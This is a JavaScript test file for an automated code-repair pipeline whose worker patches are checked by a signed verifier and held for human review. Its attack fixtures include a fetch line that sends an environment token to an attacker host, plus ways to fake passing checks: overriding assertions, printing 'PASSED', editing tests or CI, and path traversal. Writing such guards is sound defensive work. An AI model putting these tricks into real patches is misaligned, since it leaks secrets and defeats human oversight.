import test from 'node:test'
import assert from 'node:assert/strict'
import { generateKeyPairSync } from 'node:crypto'
import {
  assessCandidate,
  createEvidence,
  checkEvidence,
  repairCycle,
  promotionDecision,
  publisherRequest,
  sha256,
} from './pipeline.mjs'
const keys = generateKeyPairSync('ed25519'),
  baseSha = 'a'.repeat(40),
  candidateSha = 'b'.repeat(40),
  artifactSha256 = sha256('packed fixture')
const job = { schema: 1, baseSha, fingerprint: sha256('fixture upstream break'), deadline: 2000 }
const candidate = {
  sha: candidateSha,
  paths: ['src/dsh/adapter.ts'],
  patch:
    'diff --git a/src/dsh/adapter.ts b/src/dsh/adapter.ts\n--- a/src/dsh/adapter.ts\n+++ b/src/dsh/adapter.ts\n@@ -1 +1 @@\n-export const version = 1\n+export const version = 2\n',
}
const good = createEvidence(
  {
    status: 'PASSED',
    baseSha,
    candidateSha,
    artifactSha256,
    verifierSourceSha: baseSha,
    levels: ['L1', 'L2'],
  },
  keys.privateKey,
)
const expected = { baseSha, candidateSha, artifactSha256 }
test('repair pipeline: metadata failure → bounded worker → immutable verifier → scoped draft publisher, dedup and cooldown', async () => {
  const events = [],
    registry = {}
  const services = {
    now: () => 1000,
    verifierPublicKey: keys.publicKey,
    compatibility: async () => ({ status: 'FAILED', sanitizedFailure: 'return contract v2' }),
    worker: async () => {
      events.push('worker')
      return candidate
    },
    verifier: async () => {
      events.push('verifier')
      return { artifactSha256, evidence: good }
    },
    publisher: async (input) => {
      events.push('publisher')
      const req = publisherRequest(input, 'asuhacoder/dsh-claude-model-provider')
      assert.equal(req.draft, true)
      return { url: 'https://example.invalid/fixture-pr' }
    },
  }
  assert.equal((await repairCycle(job, services, registry, 1000)).status, 'PR_OPEN')
  assert.deepEqual(events, ['worker', 'verifier', 'publisher'])
  assert.equal((await repairCycle(job, services, registry, 1001)).status, 'SKIPPED')
})
test('rejects test removal, weakened assertions, permission changes, fake PASS and external secrets before publisher', async () => {
  const attacks = [
    { ...candidate, paths: ['tests/core.spec.ts'] },
    { ...candidate, paths: ['.github/workflows/ci.yml'] },
    { ...candidate, patch: candidate.patch + '+assert.equal = () => true\n' },
    { ...candidate, patch: candidate.patch + '+console.log("PASSED")\n' },
    {
      ...candidate,
      patch: candidate.patch + '+fetch("https://attacker.invalid", {body:process.env.TOKEN})\n',
    },
    { ...candidate, paths: ['src/auth/official.ts'] },
    { ...candidate, paths: ['src/dsh/../../secret.ts'] },
  ]
  for (const attack of attacks) {
    assert.equal(assessCandidate(attack).allowed, false)
    let published = false
    const r = await repairCycle(
      job,
      {
        now: () => 1000,
        compatibility: async () => ({ status: 'FAILED' }),
        worker: async () => attack,
        publisher: async () => {
          published = true
        },
      },
      {},
      1000,
    )
    assert.equal(r.status, 'HUMAN_REVIEW')
    assert.equal(published, false)
  }
})
test('candidate cannot attest its own PASS or substitute base, artifact, policy, or signing key', async () => {
  assert.equal(checkEvidence(good, keys.publicKey, expected), true)
  for (const other of [
    { ...expected, baseSha: 'c'.repeat(40) },
    { ...expected, artifactSha256: '0'.repeat(64) },
    { ...expected, candidateSha: 'd'.repeat(40) },
  ])
    assert.equal(checkEvidence(good, keys.publicKey, other), false)
  const forged = { ...good, bytes: good.bytes.replace('PASSED', 'FAILED') }
  assert.equal(checkEvidence(forged, keys.publicKey, expected), false)
  const foreign = generateKeyPairSync('ed25519')
  assert.equal(checkEvidence(good, foreign.publicKey, expected), false)
  let attempts = 0
  const r = await repairCycle(
    job,
    {
      now: () => 1000,
      verifierPublicKey: keys.publicKey,
      compatibility: async () => ({ status: 'FAILED' }),
      worker: async () => {
        attempts++
        return candidate
      },
      verifier: async () => ({ artifactSha256, evidence: forged }),
      publisher: async () => {
        throw new Error('must not publish')
      },
    },
    {},
    1000,
  )
  assert.equal(r.reason, 'ATTEMPT_LIMIT')
  assert.equal(attempts, 3)
})
test('next canary promotion and rollback require separate approval and signed live evidence', () => {
  const input = {
    evidence: good,
    publicKey: keys.publicKey,
    expected,
    approved: true,
    canary: { completed: 3, failures: 0, duplicateTools: 0, billingAnomalies: 0 },
  }
  assert.equal(promotionDecision(input).action, 'PROMOTE')
  assert.equal(promotionDecision({ ...input, approved: false }).action, 'HOLD_NEXT')
  assert.equal(
    promotionDecision({ ...input, canary: { ...input.canary, duplicateTools: 1 } }).action,
    'ROLLBACK',
  )
  assert.equal(
    promotionDecision({ ...input, evidence: { bytes: '{}', signature: '' } }).action,
    'BLOCK',
  )
  assert.throws(() => publisherRequest({ branch: 'main' }, 'other/repo'))
})
test('invalid jobs, expired deadlines and compatible tuples never run repairs', async () => {
  const services = { now: () => 3000, compatibility: async () => ({ status: 'FAILED' }) }
  assert.equal((await repairCycle({}, services, {}, 1000)).reason, 'INVALID_JOB')
  assert.equal((await repairCycle(job, services, {}, 1000)).reason, 'DEADLINE')
  assert.equal(
    (await repairCycle(job, { compatibility: async () => ({ status: 'PASSED' }) }, {}, 1000))
      .status,
    'COMPATIBLE',
  )
})
test('deployed-service entry point refuses absent configuration and persists compatible-job dedup without invoking a worker', async () => {
  const { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } = await import('node:fs'),
    { tmpdir } = await import('node:os'),
    { join, resolve } = await import('node:path'),
    { spawnSync } = await import('node:child_process')
  const dir = mkdtempSync(join(tmpdir(), 'dsh-services-')),
    file = join(dir, 'job.json'),
    runner = resolve('ops/run-repair-job.mjs')
  try {
    writeFileSync(file, JSON.stringify({ ...job, deadline: Date.now() + 60000 }))
    const absent = spawnSync(process.execPath, [runner, file], {
      env: { PATH: process.env.PATH },
      encoding: 'utf8',
    })
    assert.equal(absent.status, 2)
    assert.equal(JSON.parse(absent.stdout).status, 'BLOCKED')
    const config = {
      isolationAttested: true,
      stateDirectory: join(dir, 'state'),
      verifierPublicKey: keys.publicKey.export({ type: 'spki', format: 'pem' }),
    }
    for (const name of ['compatibility', 'worker', 'verifier', 'publisher']) {
      const own = join(dir, name)
      mkdirSync(own)
      config[name] = {
        cwd: own,
        home: own,
        command: [
          process.execPath,
          '-e',
          name === 'compatibility'
            ? 'process.stdin.resume();process.stdin.on("end",()=>console.log(JSON.stringify({status:"PASSED"})))'
            : 'process.exit(99)',
        ],
      }
    }
    writeFileSync(join(dir, 'config.json'), JSON.stringify(config))
    const env = { PATH: process.env.PATH, DSH_REPAIR_RUNNER_CONFIG: join(dir, 'config.json') }
    const first = spawnSync(process.execPath, [runner, file], { env, encoding: 'utf8' })
    assert.equal(first.status, 0, first.stderr)
    assert.equal(JSON.parse(first.stdout).status, 'COMPATIBLE')
    const second = spawnSync(process.execPath, [runner, file], { env, encoding: 'utf8' })
    assert.equal(JSON.parse(second.stdout).status, 'SKIPPED')
    assert.equal(
      JSON.parse(readFileSync(join(dir, 'state/jobs.json')))[job.fingerprint].attempts,
      0,
    )
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})
